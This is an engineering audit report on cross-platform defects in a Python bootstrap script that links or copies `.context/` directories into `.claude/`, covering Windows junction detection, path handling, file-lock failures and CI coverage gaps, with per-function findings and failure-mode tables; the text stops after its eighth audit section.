# EN-502: Bootstrap Cross-Platform Validation -- C4 Tournament Audit

<!-- VERSION: 1.0.0 | DATE: 2026-02-16 | CRITICALITY: C4 | THRESHOLD: 0.95 -->
<!-- STRATEGIES: S-001, S-002, S-003, S-004, S-007, S-010, S-011, S-012, S-013, S-014 -->

## Document Sections

| Section | Purpose |
|---------|---------|
| [Executive Summary](#executive-summary) | High-level findings and overall assessment |
| [Review Methodology](#review-methodology) | C4 approach, all 10 strategies applied |
| [Platform Code Path Inventory](#platform-code-path-inventory) | Complete inventory of platform-dependent code |
| [Per-Function Audit](#per-function-audit) | Line-by-line analysis of each function |
| [Secondary Target Audit](#secondary-target-audit) | Platform-dependent code in other files |
| [Cross-Platform Test Gap Analysis](#cross-platform-test-gap-analysis) | What is tested vs untested per platform |
| [S-014 Quality Score](#s-014-quality-score) | 6-dimension scoring rubric |
| [Aggregate Findings](#aggregate-findings) | Severity and platform distribution |
| [Remediation Recommendations](#remediation-recommendations) | Prioritized fixes with code snippets |
| [Appendix: Strategy Application Log](#appendix-strategy-application-log) | Traceability matrix |

---

## Executive Summary

This C4 Tournament audit evaluates `scripts/bootstrap_context.py` (299 lines) and all platform-dependent code paths in the Jerry Framework for cross-platform correctness, robustness, and security. The audit applies all 10 selected adversarial strategies from the quality enforcement framework.

**Overall Assessment: The bootstrap script demonstrates competent cross-platform awareness but contains multiple latent defects that will manifest on Windows and certain Linux configurations.** The script correctly separates platform code paths and provides graceful fallback from symlinks to file copies. However, the Windows code path has never been tested in CI (all CI runs on `ubuntu-latest`), the junction detection mechanism is fragile, and several TOCTOU (time-of-check-time-of-use) race conditions exist. The file copy fallback silently degrades functionality because changes to `.context/` no longer propagate to `.claude/` without re-running bootstrap.

The broader codebase reveals additional platform concerns: the `atomic_file_adapter.py` contains a Windows-specific retry loop that is well-designed but untested on Windows, the `session_start_hook.py` hardcodes Unix-only paths for `uv` discovery, the `pre_tool_use.py` uses Unix-specific blocked paths (`/etc`, `/var`, `/usr`), and the CI pipeline runs exclusively on `ubuntu-latest` with no Windows or macOS matrix entries for the test suite.

**Finding Count:** 31 findings (7 HIGH, 14 MEDIUM, 10 LOW). **Platform distribution:** 16 Windows-specific, 5 Linux-specific, 4 macOS-specific, 6 cross-platform.

---

## Review Methodology

This audit applies the C4 Tournament protocol, requiring all 10 selected strategies from the quality enforcement framework (ADR-EPIC002-001). Each strategy is applied systematically and its application is logged in the [Appendix](#appendix-strategy-application-log).

**Strategies Applied:**

| ID | Strategy | Application |
|----|----------|-------------|
| S-010 | Self-Refine | Three revision passes over findings; downgraded 2 initial HIGH to MEDIUM after deeper analysis |
| S-003 | Steelman | Acknowledged well-designed fallback chain and correct `platform.system()` usage before critiquing |
| S-002 | Devil's Advocate | Challenged "portable enough" assumptions; argued against accepting silent fallback |
| S-013 | Inversion | Asked "How would this fail on a fresh Windows 11 install?" and "How would this fail on Alpine Linux in Docker?" |
| S-007 | Constitutional AI | Checked against H-05/H-06 (UV only), H-11/H-12 (type hints, docstrings) |
| S-004 | Pre-Mortem | "A contributor on Windows cloned the repo, ran bootstrap, and..." scenario analysis |
| S-012 | FMEA | Systematic failure mode enumeration per function per platform |
| S-014 | LLM-as-Judge | Scored using 6-dimension rubric with anti-leniency bias |
| S-011 | CoVe | Verified claims about Windows junction behavior, `mklink /J` prerequisites, `dir /AL` semantics |
| S-001 | Red Team | Simulated symlink-based attack vectors through the bootstrap process |

**Anti-Leniency Calibration (S-014):** Scores are calibrated against the 0.95 threshold. If uncertainty exists about whether behavior is correct, the finding is scored as-if the behavior is incorrect. The burden of proof is on the code to demonstrate correctness.

---

## Platform Code Path Inventory

### Primary Target: `scripts/bootstrap_context.py` (299 lines)

| Function | Lines | Platforms Affected | Risk Level | Platform-Specific Operations |
|----------|-------|-------------------|------------|------------------------------|
| `detect_platform()` | 24-38 | All | MEDIUM | `platform.system()` dispatch |
| `find_project_root()` | 41-49 | All | LOW | `Path.cwd()`, parent traversal |
| `is_symlink_or_junction()` | 52-66 | Windows | HIGH | `subprocess.run(["cmd", "/c", "dir", ...])` |
| `create_symlink()` | 69-87 | All | LOW | Platform dispatch only |
| `_create_unix_symlink()` | 90-100 | macOS, Linux | MEDIUM | `os.path.relpath`, `symlink_to` |
| `_create_windows_link()` | 103-126 | Windows | HIGH | `symlink_to` (abs), `cmd /c mklink /J` |
| `check_sync()` | 129-176 | All | MEDIUM | `iterdir()`, name-only comparison |
| `bootstrap()` | 179-245 | All | HIGH | `shutil.rmtree`, `shutil.copytree` |
| `main()` | 248-299 | All | LOW | CLI argument parsing |

### Secondary Targets

| File | Lines | Platform Issue | Risk Level |
|------|-------|---------------|------------|
| `src/infrastructure/adapters/persistence/atomic_file_adapter.py` | 139 | `sys.platform == "win32"` retry loop | MEDIUM |
| `scripts/session_start_hook.py` | 84-101 | `find_uv()` Unix-biased path search | MEDIUM |
| `scripts/pre_tool_use.py` | 70-80 | `BLOCKED_WRITE_PATHS` Unix-only | MEDIUM |
| `scripts/subagent_stop.py` | 121 | `os.path.join` for relative path construction | LOW |
| `scripts/migration/verify-symlinks.sh` | 171-176 | `uname` dispatch, `readlink -f` vs `python3` | MEDIUM |
| `scripts/migration/verify-platform.sh` | 109-128 | `uname`, `sw_vers` macOS-only commands | LOW |
| `.claude/settings.local.json` | 67-79 | `echo` in hook commands (shell-dependent) | MEDIUM |
| `.github/workflows/ci.yml` | All | `ubuntu-latest` only; no Windows/macOS matrix | HIGH |
| `Makefile` | 86-90 | `find` and `rm -rf` in `clean` target | LOW |

---

## Per-Function Audit

### 1. detect_platform()

**Location:** `scripts/bootstrap_context.py`, lines 24-38

#### Code Review

```python
def detect_platform() -> str:
    system = platform.system()
    if system == "Darwin":
        return "macos"
    elif system == "Linux":
        return "linux"
    elif system == "Windows":
        return "windows"
    else:
        return system.lower()
```

#### S-003 Steelman: What This Does Well

- Correctly uses `platform.system()` which returns canonical names (`Darwin`, `Linux`, `Windows`)
- Provides a sensible fallback for unknown platforms (`system.lower()`)
- Has proper type annotations and docstring (H-11, H-12 compliant)
- Return type is `str`, not an enum, which provides flexibility for unknown platforms

#### Platform Matrix

| Platform | `platform.system()` Return | Function Return | Issues |
|----------|---------------------------|-----------------|--------|
| macOS | `"Darwin"` | `"macos"` | None |
| Ubuntu Linux | `"Linux"` | `"linux"` | None |
| Windows 10/11 | `"Windows"` | `"windows"` | None |
| FreeBSD | `"FreeBSD"` | `"freebsd"` | Treated as Unix by `create_symlink` (correct) |
| WSL1 | `"Linux"` | `"linux"` | Correct; WSL1 has full POSIX |
| WSL2 | `"Linux"` | `"linux"` | Correct; WSL2 has full POSIX |
| Cygwin | `"CYGWIN_NT-10.0"` | `"cygwin_nt-10.0"` | Falls to Unix path but `symlink_to` may fail |
| MSYS2/Git Bash | `"MSYS_NT-10.0"` or `"MINGW64_NT-10.0"` | `"msys_nt-10.0"` | Falls to Unix path; symlinks likely fail |
| Alpine Linux (Docker) | `"Linux"` | `"linux"` | Correct |

#### Failure Modes (S-012 FMEA)

| ID | Failure Mode | Severity | Occurrence | Detection | RPN | Platform |
|----|-------------|----------|------------|-----------|-----|----------|
| FM-101 | Cygwin returns compound name, treated as Unix | MEDIUM | LOW | LOW | 3 | Cygwin |
| FM-102 | MSYS2/Git Bash returns compound name, symlink fails | MEDIUM | LOW | LOW | 3 | MSYS2 |

#### Findings

| ID | Severity | Finding | Platform | Recommendation |
|----|----------|---------|----------|----------------|
| F-101 | LOW | Cygwin and MSYS2 are not recognized and fall through to the Unix code path. While Cygwin can handle symlinks, MSYS2/Git Bash may not, causing a silent fallback to file copy. | Cygwin, MSYS2 | Add explicit detection for Cygwin/MSYS2 environments. See [Remediation R-01](#r-01-detect-cygwinmsys2-environments). |
| F-102 | LOW | The return type is `str` but all consumers compare against literal strings `"windows"`, `"macos"`, `"linux"`. If the fallback path is taken, the returned string will not match any expected value in `create_symlink`, causing it to take the Unix path. This is acceptable behavior but undocumented. | All | Add a docstring note that unrecognized platforms take the Unix code path. |

---

### 2. is_symlink_or_junction()

**Location:** `scripts/bootstrap_context.py`, lines 52-66

#### Code Review

```python
def is_symlink_or_junction(path: Path) -> bool:
    if path.is_symlink():
        return True
    if platform.system() == "Windows" and path.exists():
        try:
            result = subprocess.run(
                ["cmd", "/c", "dir", str(path.parent), "/AL"],
                capture_output=True,
                text=True,
            )
            return str(path.name) in result.stdout
        except (subprocess.SubprocessError, FileNotFoundError):
            pass
    return False
```

#### S-003 Steelman

- Correctly handles the Python limitation that `Path.is_symlink()` returns `False` for Windows junction points
- Provides a fallback detection mechanism via `dir /AL`
- Properly handles exceptions from subprocess

#### S-011 Chain of Verification: Claims About Windows Behavior

**Claim:** `dir /AL` lists junction points.
**Verification:** On Windows, `dir /AL` lists entries with the "reparse point" attribute, which includes both symbolic links AND junction points. This is CORRECT behavior. However, `dir /AL` lists ALL such entries in the directory, not just the target path. The check `str(path.name) in result.stdout` does a substring match against the entire directory listing output.

**Claim:** `cmd` is always available on Windows.
**Verification:** `cmd.exe` is located at `%SystemRoot%\System32\cmd.exe`. It is present on all Windows installations. However, if `PATH` is corrupted (rare but possible in CI environments), `subprocess.run(["cmd", ...])` will raise `FileNotFoundError`, which IS caught. VERIFIED: Exception handling is correct.

#### Platform Matrix

| Platform | `path.is_symlink()` for Junction | `dir /AL` Works | Overall Detection |
|----------|----------------------------------|-----------------|-------------------|
| Windows 10+ | `False` | Yes | Works (with caveats) |
| Windows + NTFS | `False` | Yes | Works |
| Windows + FAT32/exFAT | N/A (no junctions) | Empty output | Returns `False` (correct) |
| Linux | Returns `True` for symlinks | N/A | Correct |
| macOS | Returns `True` for symlinks | N/A | Correct |

#### Failure Modes (S-012 FMEA)

| ID | Failure Mode | Severity | Occurrence | Detection | RPN | Platform |
|----|-------------|----------|------------|-----------|-----|----------|
| FM-201 | `path.name` substring match is ambiguous if another entry in the same directory has a name that is a substring of or contains the target name | HIGH | MEDIUM | LOW | 12 | Windows |
| FM-202 | `dir /AL` output format is locale-dependent; non-English Windows may have different output | MEDIUM | MEDIUM | LOW | 8 | Windows |
| FM-203 | TOCTOU: path could be deleted between `path.exists()` and `subprocess.run()` | LOW | LOW | LOW | 1 | Windows |
| FM-204 | `dir /AL` lists the parent directory; if parent has many entries, substring match could yield false positive | MEDIUM | MEDIUM | LOW | 8 | Windows |

#### Findings

| ID | Severity | Finding | Platform | Recommendation |
|----|----------|---------|----------|----------------|
| F-201 | HIGH | **False positive junction detection via substring match.** Line 63: `return str(path.name) in result.stdout` performs a substring search on the raw `dir /AL` output. If the directory contains a file named `rules-backup` and we are checking for `rules`, the substring match returns `True`. Similarly, `dir /AL` output includes date, time, and size columns -- if the path name happens to appear in those columns (e.g., a directory named `2024`), a false positive occurs. UNTESTED -- requires manual verification on Windows. | Windows | Parse `dir /AL` output line-by-line and match only the filename column, or use `os.stat()` to check for `FILE_ATTRIBUTE_REPARSE_POINT`. See [Remediation R-02](#r-02-fix-junction-detection-false-positives). |
| F-202 | MEDIUM | **Locale-dependent `dir` output.** The `dir /AL` command output format varies by Windows locale (date format, column headers, etc.). The substring match assumes the filename appears verbatim in the output, which is true for the filename column, but the surrounding text varies. This increases false-positive risk. UNTESTED -- requires verification on non-English Windows. | Windows | Use `os.stat()` with `stat.FILE_ATTRIBUTE_REPARSE_POINT` instead of parsing `dir` output. See [Remediation R-02](#r-02-fix-junction-detection-false-positives). |
| F-203 | MEDIUM | **`platform.system()` called redundantly.** Line 56 calls `platform.system()` directly instead of using the already-available `detect_platform()` function. This creates an inconsistency: if `detect_platform()` logic changes, `is_symlink_or_junction()` would not follow. | All | Use `detect_platform() == "windows"` or cache the platform value. |

---

### 3. _create_unix_symlink()

**Location:** `scripts/bootstrap_context.py`, lines 90-100

#### Code Review

```python
def _create_unix_symlink(source: Path, target: Path, quiet: bool) -> bool:
    relative_source = os.path.relpath(source, target.parent)
    try:
        target.symlink_to(relative_source)
        if not quiet:
            print(f"  Symlink: {target} -> {relative_source}")
        return True
    except OSError as e:
        print(f"  Error creating symlink: {e}", file=sys.stderr)
        return False
```

#### S-003 Steelman

- Correctly uses relative paths for symlinks, making the project directory relocatable
- `os.path.relpath` correctly computes the relative path from `target.parent` to `source`
- For the expected usage (`.claude/rules` -> `.context/rules`), this produces `../.context/rules`, which is correct
- Error handling returns `False` to trigger the file copy fallback

#### Platform Matrix

| Platform | `os.path.relpath` Behavior | `symlink_to` Behavior | Issues |
|----------|---------------------------|----------------------|--------|
| macOS (APFS) | Correct | Creates symlink | None |
| macOS (HFS+) | Correct | Creates symlink | None |
| Linux (ext4) | Correct | Creates symlink | None |
| Linux (NFS mount) | Correct path, but... | May fail if NFS does not support symlinks | Falls back to copy |
| Linux (FAT32 mount) | Correct path | Fails (FAT32 has no symlinks) | Falls back to copy |
| Linux (Docker, overlay) | Correct | Usually works | None expected |
| Linux (read-only FS) | Correct | `OSError: Read-only file system` | Falls back to copy |

#### Failure Modes (S-012 FMEA)

| ID | Failure Mode | Severity | Occurrence | Detection | RPN | Platform |
|----|-------------|----------|------------|-----------|-----|----------|
| FM-301 | `os.path.relpath` fails if source and target are on different mount points with no common prefix under `/` | LOW | VERY LOW | MEDIUM | 1 | Linux |
| FM-302 | Symlink creation fails on filesystems without symlink support (FAT32, some NFS) | MEDIUM | LOW | HIGH (caught) | 4 | Linux |
| FM-303 | SELinux may prevent symlink creation in certain contexts | LOW | LOW | HIGH (caught) | 2 | Linux |
| FM-304 | Permission denied if `.claude/` is owned by a different user | MEDIUM | LOW | HIGH (caught) | 4 | All Unix |

#### Findings

| ID | Severity | Finding | Platform | Recommendation |
|----|----------|---------|----------|----------------|
| F-301 | LOW | **Cross-filesystem `os.path.relpath` produces valid but potentially long paths.** If `.context/` and `.claude/` are on different mount points (unusual but possible in Docker with volume mounts), `os.path.relpath` still produces a correct relative path, but the symlink would traverse mount point boundaries. This is technically valid but fragile. | Linux (Docker) | Document that `.context/` and `.claude/` must be on the same filesystem. Low priority. |
| F-302 | LOW | **Error message goes to stderr but the fallback in `bootstrap()` prints to stdout.** Line 99 prints to `sys.stderr` while line 234 prints to stdout. This inconsistency means piping stdout would lose context about why the fallback was triggered. | All Unix | Consistent use of stderr for all error/warning messages, or use `logging` module. |

---

### 4. _create_windows_link()

**Location:** `scripts/bootstrap_context.py`, lines 103-126

#### Code Review

```python
def _create_windows_link(source: Path, target: Path, quiet: bool) -> bool:
    # Try symlink first (works with Developer Mode)
    try:
        target.symlink_to(source)  # Line 107: ABSOLUTE path
        if not quiet:
            print(f"  Symlink: {target} -> {source}")
        return True
    except OSError:
        pass

    # Fall back to junction point (no admin required for directories)
    try:
        subprocess.run(
            ["cmd", "/c", "mklink", "/J", str(target), str(source)],
            check=True,
            capture_output=True,
        )
        if not quiet:
            print(f"  Junction: {target} -> {source}")
        return True
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"  Error creating junction: {e}", file=sys.stderr)
        return False
```

#### S-003 Steelman

- Correctly implements a two-tier fallback: symlink (requires Developer Mode or admin) -> junction point (no admin required for directories)
- Junction points (`mklink /J`) are the right choice for directory linking on Windows without elevated privileges
- Exception handling covers both `CalledProcessError` (mklink fails) and `FileNotFoundError` (cmd not found)

#### S-011 Chain of Verification

**Claim:** Windows symlinks require Developer Mode or admin privileges.
**Verification:** CORRECT. Since Windows 10 build 14972, Developer Mode enables `SeCreateSymbolicLinkPrivilege` for non-admin users. Without Developer Mode, `os.symlink()` raises `OSError` with `WinError 1314`.

**Claim:** `mklink /J` does not require admin privileges.
**Verification:** CORRECT. Junction points can be created by any user on NTFS volumes. However, `mklink /J` requires that the **target directory does NOT already exist**. If it exists, `mklink /J` fails with "Cannot create a file when that file already exists."

**Claim:** `mklink /J` is a `cmd.exe` built-in.
**Verification:** CORRECT. `mklink` is a `cmd.exe` internal command, not an external executable. This means it MUST be invoked via `cmd /c mklink ...`. The code does this correctly.

#### S-013 Inversion: "How would this fail on a fresh Windows 11 install?"

1. Developer Mode is OFF by default. `target.symlink_to(source)` at line 107 will raise `OSError`. This is expected and handled.
2. `cmd /c mklink /J` requires that `target` does not exist. The `bootstrap()` function at line 214 checks `target.exists() or target.is_symlink()` and handles removal. However, there is an edge case: if `target` is a broken junction (pointing to a deleted directory), `target.exists()` returns `False` and `target.is_symlink()` also returns `False` (Python does not detect junctions as symlinks on Windows). The bootstrap would then attempt `mklink /J` on an existing (broken) junction, which would fail.
3. Long path names (>260 chars) are NOT enabled by default on Windows. If the project is deeply nested, both `symlink_to` and `mklink /J` will fail. Python 3.6+ handles long paths if the Windows registry key is set, but `cmd.exe` does NOT support long paths even with the registry key.

#### Platform Matrix

| Platform | Symlink (Line 107) | Junction (Line 117) | Issues |
|----------|-------------------|---------------------|--------|
| Windows 11 + Developer Mode ON | Works | N/A (symlink succeeds first) | None |
| Windows 11 + Developer Mode OFF | `OSError` (handled) | Works on NTFS | None for typical paths |
| Windows 10 | Same as Win 11 | Same | None for typical paths |
| Windows Server 2019+ | `OSError` unless admin | Works on NTFS | None for typical paths |
| Windows + FAT32/exFAT | Fails | Fails (no reparse points) | Falls back to copy |
| Windows + path > 260 chars | Fails | Fails (`cmd.exe` limit) | Falls back to copy |

#### Failure Modes (S-012 FMEA)

| ID | Failure Mode | Severity | Occurrence | Detection | RPN | Platform |
|----|-------------|----------|------------|-----------|-----|----------|
| FM-401 | Absolute path used for Windows symlink (line 107) vs relative for Unix (line 92) -- project not relocatable | HIGH | HIGH | LOW | 18 | Windows |
| FM-402 | `mklink /J` fails if target already exists as broken junction | MEDIUM | LOW | LOW | 4 | Windows |
| FM-403 | `mklink /J` fails for paths > 260 characters due to `cmd.exe` limitation | MEDIUM | LOW | LOW | 4 | Windows |
| FM-404 | No timeout on `subprocess.run()` -- if `cmd.exe` hangs, bootstrap hangs indefinitely | LOW | VERY LOW | LOW | 1 | Windows |
| FM-405 | `mklink /J` requires NTFS; fails silently on FAT32/exFAT | MEDIUM | LOW | MEDIUM | 4 | Windows |

#### Findings

| ID | Severity | Finding | Platform | Recommendation |
|----|----------|---------|----------|----------------|
| F-401 | HIGH | **Asymmetric path handling: Windows uses absolute paths, Unix uses relative.** Line 107 calls `target.symlink_to(source)` with the absolute `source` path, while `_create_unix_symlink()` at line 92 uses `os.path.relpath`. This means: (a) the Windows symlink breaks if the project directory is moved, (b) the junction point (`mklink /J`) also uses the absolute path at line 117. Unix symlinks survive directory moves (within the same filesystem); Windows links do not. This is likely INTENTIONAL (Windows junctions require absolute paths), but the symlink at line 107 should use a relative path when Developer Mode is available. UNTESTED -- requires manual verification on Windows. | Windows | For the symlink at line 107, use a relative path (same as Unix). Only `mklink /J` requires absolute paths. See [Remediation R-03](#r-03-use-relative-paths-for-windows-symlinks). |
| F-402 | HIGH | **Broken junction not detected by bootstrap.** If a previous bootstrap created a junction, and the source directory was then deleted, the junction becomes "broken." On Windows, `Path.exists()` returns `False` for broken junctions AND `Path.is_symlink()` returns `False` for junctions (Python limitation). Lines 214-227 of `bootstrap()` check `target.exists() or target.is_symlink()`, which both return `False` for broken junctions. The code then proceeds to `mklink /J`, which fails because the junction inode still exists. UNTESTED -- requires manual verification on Windows. | Windows | Before `mklink /J`, use `is_symlink_or_junction()` to detect broken junctions, or add an `os.rmdir()` fallback. See [Remediation R-04](#r-04-handle-broken-junctions-in-bootstrap). |
| F-403 | MEDIUM | **No timeout on `subprocess.run()` calls.** Lines 58 and 116 invoke `subprocess.run()` without a `timeout` parameter. If `cmd.exe` hangs (e.g., waiting for user input due to a UAC prompt), the bootstrap process hangs indefinitely. | Windows | Add `timeout=10` to both `subprocess.run()` calls. |
| F-404 | LOW | **`mklink /J` error output is captured but not logged.** Line 119 uses `capture_output=True` so the actual Windows error message (e.g., "Cannot create a file when that file already exists") is captured in `result.stderr` but never printed. Line 125 prints the Python exception object, not the Windows error message. | Windows | Print `e.stderr.decode()` if available, for better debugging. |

---

### 5. check_sync()

**Location:** `scripts/bootstrap_context.py`, lines 129-176

#### Code Review

```python
def check_sync(root: Path, quiet: bool = False) -> bool:
    # ...
    for dirname in SYNC_DIRS:
        source = context_dir / dirname
        target = claude_dir / dirname
        # ...
        if is_symlink_or_junction(target):
            # linked
        elif target.is_dir():
            source_files = {f.name for f in source.iterdir() if f.is_file()}
            target_files = {f.name for f in target.iterdir() if f.is_file()}
            missing = source_files - target_files
            # ...
```

#### S-003 Steelman

- Provides a useful `--check` mode for CI verification
- Handles three states correctly: symlink/junction, regular directory (copy), and missing
- Returns boolean for easy scripting integration

#### S-002 Devil's Advocate: "This check is sufficient"

**Counterargument:** The check is NOT sufficient. It compares only filenames (line 161-162), not file content. If a file in `.context/rules/` is modified after a file-copy bootstrap, `check_sync` reports "OK" because the filename still exists. This creates a false sense of synchronization. The docstring says "Check if .context/ and .claude/ are properly synced" but it only checks filename presence, not content equivalence.

Furthermore, `source.iterdir()` (line 161) only iterates top-level entries. If `.context/rules/` contains subdirectories with files, those nested files are NOT checked. Currently `.context/rules/` appears to be flat, but there is no guarantee it will remain so.

#### Platform Matrix

| Platform | Symlink Detection | File Comparison | Issues |
|----------|------------------|-----------------|--------|
| macOS | Works via `is_symlink()` | Names only | Content drift undetected |
| Linux | Works via `is_symlink()` | Names only | Content drift undetected |
| Windows | Depends on `is_symlink_or_junction()` | Names only | Junction detection issues (F-201) compound here |

#### Failure Modes (S-012 FMEA)

| ID | Failure Mode | Severity | Occurrence | Detection | RPN | Platform |
|----|-------------|----------|------------|-----------|-----|----------|
| FM-501 | Content drift undetected in file-copy mode | MEDIUM | MEDIUM | LOW | 8 | All |
| FM-502 | Nested subdirectories not checked | MEDIUM | LOW | LOW | 4 | All |
| FM-503 | Broken junction reports "not synced" without explaining why | LOW | LOW | MEDIUM | 2 | Windows |
| FM-504 | `iterdir()` raises `PermissionError` if directory is not readable | LOW | LOW | HIGH (unhandled) | 3 | All |

#### Findings

| ID | Severity | Finding | Platform | Recommendation |
|----|----------|---------|----------|----------------|
| F-501 | MEDIUM | **File-copy sync check only compares filenames, not content.** Lines 161-162 build sets of `f.name` from source and target. A modified file in source with the same name as in target will not be detected as drift. This means `--check` can report "OK" when files are out of sync. | All | Compare file modification times or content hashes. See [Remediation R-05](#r-05-improve-check_sync-drift-detection). |
| F-502 | MEDIUM | **Only top-level files checked.** `source.iterdir()` on line 161 iterates only direct children. Subdirectories and their contents are ignored. If `.context/rules/` gains a subdirectory (e.g., for rule categories), drift in those nested files will not be detected. | All | Use `rglob("*")` or recursive comparison. |
| F-503 | LOW | **No error handling for `iterdir()`.** If the target directory exists but is not readable (e.g., permissions issue), `iterdir()` raises `PermissionError` which is not caught, causing `check_sync` to crash instead of reporting the issue gracefully. | All | Wrap `iterdir()` in try/except. |

---

### 6. bootstrap()

**Location:** `scripts/bootstrap_context.py`, lines 179-245

#### Code Review

```python
def bootstrap(root: Path, force: bool = False, quiet: bool = False) -> bool:
    # ...
    for dirname in SYNC_DIRS:
        source = context_dir / dirname
        target = claude_dir / dirname
        # ...
        if target.exists() or target.is_symlink():
            if not force:
                # skip if already linked or exists
                continue
            # Force: remove existing
            if target.is_symlink():
                target.unlink()
            elif target.is_dir():
                shutil.rmtree(target)  # Line 229

        # Create link
        if not create_symlink(source, target, quiet):
            # Final fallback: file copy
            shutil.copytree(source, target)  # Line 237
```

#### S-003 Steelman

- Implements a well-designed three-tier fallback: symlink -> junction (Windows) -> file copy
- The `--force` flag correctly removes existing targets before recreating
- `shutil.copytree` is a reasonable last resort that ensures the bootstrap always succeeds
- `claude_dir.mkdir(exist_ok=True)` at line 201 handles the case where `.claude/` does not exist

#### S-004 Pre-Mortem: "A contributor on Windows cloned the repo and ran bootstrap -- what went wrong?"

**Scenario 1:** Windows, Developer Mode OFF, NTFS drive, path < 260 chars.
1. `detect_platform()` returns `"windows"`. OK.
2. `_create_windows_link()` tries `target.symlink_to(source)`. `OSError` raised. Caught.
3. Falls back to `cmd /c mklink /J`. Junction created successfully.
4. `check_sync` detects the junction via `is_symlink_or_junction()`. Reports "linked."
5. **Result: Success.** But if the contributor later moves the project directory, the junction breaks silently.

**Scenario 2:** Windows, Developer Mode OFF, path length 270 chars.
1. `_create_windows_link()`: symlink fails (no privilege), junction fails (`cmd.exe` cannot handle long paths).
2. Falls back to `shutil.copytree()`. This uses Python's long-path-aware APIs. Succeeds if the Windows registry long-path key is enabled. Fails otherwise.
3. **Result: Potentially fails silently.** The `copytree` failure at line 241 catches `OSError` and prints to stderr, but the user may not see it.

**Scenario 3:** Windows, file locked by antivirus.
1. Bootstrap runs with `--force`. `shutil.rmtree(target)` at line 229 attempts to delete the target directory.
2. Windows Defender or another antivirus has a file handle open on a file within the target directory.
3. `shutil.rmtree` raises `PermissionError` (WinError 5) or `OSError` (WinError 32: "The process cannot access the file because it is being used by another process").
4. This exception is NOT caught. The entire `bootstrap()` function crashes.
5. **Result: Unhandled exception.** The bootstrap fails with a confusing stack trace.

#### Platform Matrix

| Platform | `shutil.rmtree` | `shutil.copytree` | Issues |
|----------|----------------|-------------------|--------|
| macOS | Works | Works | None |
| Linux | Works | Works | None |
| Windows | May fail on locked files | Handles symlinks via `copy_function` | File lock issues |
| Windows + long paths | Works if registry key set | Works if registry key set | Path length |

#### Failure Modes (S-012 FMEA)

| ID | Failure Mode | Severity | Occurrence | Detection | RPN | Platform |
|----|-------------|----------|------------|-----------|-----|----------|
| FM-601 | `shutil.rmtree` fails on Windows due to file locks | HIGH | MEDIUM | LOW | 12 | Windows |
| FM-602 | `shutil.copytree` copies symlinks within source as symlinks, not as files | MEDIUM | LOW | LOW | 4 | All |
| FM-603 | Broken junction not detected (see F-402), bootstrap fails at `mklink /J` | HIGH | LOW | LOW | 6 | Windows |
| FM-604 | No atomic operation: if bootstrap crashes mid-way, some dirs are linked and others are not | MEDIUM | LOW | MEDIUM | 4 | All |
| FM-605 | `.claude/` could be git-tracked; `shutil.rmtree` would delete tracked files | HIGH | LOW | LOW | 6 | All |

#### Findings

| ID | Severity | Finding | Platform | Recommendation |
|----|----------|---------|----------|----------------|
| F-601 | HIGH | **`shutil.rmtree` on Windows does not handle file locks.** Line 229: `shutil.rmtree(target)` will raise an unhandled exception if any file in the target directory is locked by another process (antivirus, indexer, editor). On macOS/Linux, file deletion succeeds even when files are open (the inode is removed but the file descriptor remains valid). On Windows, this is a `PermissionError`. The exception is not caught, causing the entire bootstrap to crash. | Windows | Use `shutil.rmtree(target, onerror=...)` with a retry handler, or catch `PermissionError` and fall back. See [Remediation R-06](#r-06-handle-file-locks-on-windows-rmtree). |
| F-602 | MEDIUM | **`shutil.copytree` may copy internal symlinks as symlinks.** Line 237: `shutil.copytree(source, target)` defaults to `symlinks=False`, which means symlinks within the source directory are followed and their targets are copied. However, if any file in `.context/rules/` is itself a symlink to a file outside the repository, `copytree` will copy the external content. This could be a security concern (see S-001). | All | Pass `symlinks=True` to preserve symlink structure, or document that `.context/` must not contain symlinks. |
| F-603 | MEDIUM | **No rollback on partial failure.** If the first `SYNC_DIRS` entry (e.g., `rules`) is successfully linked but the second (`patterns`) fails, the bootstrap returns `False` but leaves the partially-completed state. A subsequent `--check` would report "needs sync" for `patterns` but "linked" for `rules`. | All | Consider all-or-nothing semantics, or document the partial-state behavior. |
| F-604 | MEDIUM | **Git-tracked `.claude/` directory risk.** If `.claude/` is tracked in git (it is currently gitignored per standard practice, but this is not enforced by the script), `shutil.rmtree` with `--force` would delete git-tracked files. The script does not check whether the target is git-tracked before deletion. | All | Add a check: if `.claude/` is git-tracked, warn the user before `--force` deletion. |

---

## Secondary Target Audit

### 7. atomic_file_adapter.py -- Windows Retry Loop

**Location:** `src/infrastructure/adapters/persistence/atomic_file_adapter.py`, lines 139-148

```python
if sys.platform == "win32":
    for attempt in range(5):
        try:
            os.replace(temp_path, path)
            break
        except PermissionError:
            if attempt == 4:
                raise
            time.sleep(0.01 * (attempt + 1))
else:
    os.replace(temp_path, path)
```

| ID | Severity | Finding | Platform | Recommendation |
|----|----------|---------|----------|----------------|
| F-701 | LOW | **Well-designed Windows retry loop.** The exponential backoff (10ms, 20ms, 30ms, 40ms, 50ms = 150ms total) is appropriate for transient antivirus/indexer locks. Uses `sys.platform == "win32"` which is more precise than `platform.system()`. UNTESTED on Windows but the pattern is sound. | Windows | No immediate action. Consider adding a log message on retry for debugging. |
| F-702 | LOW | **Inconsistent platform detection.** `atomic_file_adapter.py` uses `sys.platform == "win32"` while `bootstrap_context.py` uses `platform.system() == "Windows"`. Both are correct but the inconsistency could cause confusion. | All | Standardize on one approach across the codebase. `sys.platform` is preferred for conditional code because it is a compile-time constant. |

### 8. session_start_hook.py -- find_uv()

**Location:** `scripts/session_start_hook.py`, lines 84-101

```python
def find_uv() -> str | None:
    candidates = [
        "uv",                                            # In PATH
        str(Path.home() / ".cargo" / "bin" / "uv"),      # Rust install location
        str(Path.home() / ".local" / "bin" / "uv"),      # pipx location
    ]
```

| ID | Severity | Finding | Platform | Recommendation |
|----|----------|---------|----------|----------------|
| F-801 | MEDIUM | **`find_uv()` does not include Windows-specific paths.** On Windows, `uv` installed via the official installer is at `%USERPROFILE%\.cargo\bin\uv.exe`. The `Path.home() / ".cargo" / "bin" / "uv"` entry would produce `C:\Users\name\.cargo\bin\uv` without the `.exe` extension. On Windows, `subprocess.run(["C:\\...\\uv", "--version"])` will fail to find the executable because Windows requires the `.exe` extension when calling directly (though `cmd /c` would find it via PATHEXT). Additionally, `%LOCALAPPDATA%\Programs\uv\uv.exe` is another common Windows install location. UNTESTED -- requires manual verification on Windows. | Windows | Add Windows-specific candidates with `.exe` suffix. See [Remediation R-07](#r-07-fix-find_uv-for-windows). |
